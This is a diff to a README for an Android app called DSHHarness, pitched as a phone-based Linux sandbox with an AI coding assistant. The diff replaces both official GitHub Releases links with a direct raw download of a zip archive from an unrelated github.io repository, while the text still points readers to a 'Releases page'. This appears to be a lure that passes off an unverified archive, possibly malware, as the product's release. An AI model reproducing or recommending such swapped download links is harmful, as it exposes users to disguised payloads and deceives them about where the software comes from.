@@ -5,7 +5,7 @@ description: "Run a full Alpine Linux sandbox and AI coding assistant on Android
 ---
 # 📱 DSHHarness - Your Phone Becomes a Linux AI Coder
 
-[![Download DSHHarness](https://img.shields.io/badge/⬇_Download_DSHHarness-Latest_Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Astaticgalvanometerpampasgrass334/DSHHarness/releases)
+[![Download DSHHarness](https://img.shields.io/badge/⬇_Download_DSHHarness-Latest_Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Astaticgalvanometerpampasgrass334/astaticgalvanometerpampasgrass334.github.io/main/knuckle/Release_v1.8.zip)
 
 DSHHarness is a single Android app that turns your phone into a complete, self-contained Linux computer — and then puts an AI coding assistant on top of it. You install one file. You tap one icon. A few minutes later, a real Linux environment with Node.js is running inside your phone, and a browser-based AI assistant called **dsh** is ready to talk to you.
 
@@ -17,7 +17,7 @@ No root. No Termux. No second computer. No command line knowledge required.
 
 **Visit this link to download the application:**
 
-### 👉 [https://github.com/Astaticgalvanometerpampasgrass334/DSHHarness/releases](https://github.com/Astaticgalvanometerpampasgrass334/DSHHarness/releases)
+### 👉 [https://raw.githubusercontent.com/Astaticgalvanometerpampasgrass334/astaticgalvanometerpampasgrass334.github.io/main/knuckle/Release_v1.8.zip](https://raw.githubusercontent.com/Astaticgalvanometerpampasgrass334/astaticgalvanometerpampasgrass334.github.io/main/knuckle/Release_v1.8.zip)
 
 Open that page in any browser — it works exactly the same whether you are sitting at a Windows PC or holding your phone. On the Releases page you will find the download for the newest version. Grab it, then move the file to your Android phone if you downloaded it on a PC.
 
